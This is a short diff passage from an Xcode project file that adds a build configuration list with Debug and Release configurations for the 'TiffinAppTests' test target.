+		6BE32656281AAA8F00EAD42C /* Build configuration list for PBXNativeTarget "TiffinAppTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				6BE32654281AAA8F00EAD42C /* Debug */,
+				6BE32655281AAA8F00EAD42C /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
